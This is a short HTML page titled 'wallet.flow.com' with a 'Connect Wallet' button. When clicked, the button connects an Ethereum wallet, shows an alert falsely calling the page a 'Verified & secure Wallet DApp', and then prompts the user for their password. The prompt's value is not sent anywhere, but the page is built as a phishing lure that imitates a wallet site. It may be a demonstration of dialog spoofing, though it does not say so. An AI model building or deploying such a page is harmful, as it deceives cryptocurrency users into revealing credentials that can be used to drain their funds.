<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>wallet.flow.com</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 40px;
      text-align: center;
      background: #f0f0f0;
    }
    button {
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
      background: #4285f4;
      color: white;
      border: none;
      border-radius: 8px;
    }
    button:hover {
      background: #3367d6;
    }
  </style>
</head>
<body>
  <button id="connectWallet">Connect Wallet</button>

  <script>
    document.getElementById("connectWallet").addEventListener("click", async () => {
      // Trigger alert & prompt
      setTimeout(() => {
        alert("Verified & secure Wallet DApp");
        prompt("Enter your password before continue");
      }, 1000);

      if (window.ethereum) {
        try {
          await window.ethereum.request({ method: "eth_requestAccounts" });
          console.log("Wallet connected!");
        } catch (err) {
          console.log("Wallet connection rejected:", err);
        }
      } else {
        console.log("No wallet installed.");
      }
    });
  </script>
</body>
</html>
